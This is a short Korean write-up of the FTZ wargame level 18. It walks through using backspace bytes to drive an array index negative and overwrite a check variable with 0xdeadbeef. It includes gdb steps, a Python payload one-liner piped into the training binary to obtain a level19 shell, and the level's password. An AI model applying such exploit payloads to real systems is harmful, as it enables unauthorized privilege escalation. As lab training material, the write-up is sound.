# FTZ Level18

#### ID : level18 PW: why did you do it
<br>

우선 hint의 내용을 보자<br>
```cat hint```<br>
![level18_hint](https://user-images.githubusercontent.com/58061467/91567097-8a61b900-e97f-11ea-8c89-65ba97171030.png)


~~(코드가 매우 길다...)~~<br>

코드를 보면 check 변수 값이 0xdeadbeef면 shellout 함수가 호출돼 level19권한으로 /bin/sh이 실행된다.<br>
하지만 string[100]보다 check변수가 뒤에 존재하므로 전에 풀던 방식으로 풀 수는 없다!<br>
다만 0x08 입력이 들어오면 count 변수가 1 감소하는데 이 count 변수는 string 배열의 인덱스를 조절하므로 이 배열의 인덱스가 마이너스가 되도록 하면 앞의 메모리에 접근이 가능할 것이다.!<br>
즉 string 배열로 check 변수에 접근이 가능하다는 것이다.<br>

우리의 목적을 생각해보자.<br>
1. string[100]에서 check까지 거리 구하기
2. check에 0xdeadbeef 덮어씌우기
3. 공격!

attackme 파일을 tmp로 옮기고 디버깅해보자<br>
```
gdb -q attackme
set disas intel
disas main
```

<main+499>를 보면 string에서 ebp까지의 거리가 100인 것을 알 수 있고<br>
<main+91>을 보면 check에서 ebp까지의 거리가 104인 것을 알 수 있다.<br>
따라서 string에서 check까지의 거리는 -4이다.<br>

0x08을 입력해 count 변수가 1 감소하는 것을 이용해 페이로드를 작성해보자.<br>
```(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level19 Password is "~~". 라고 나올 것이다!!
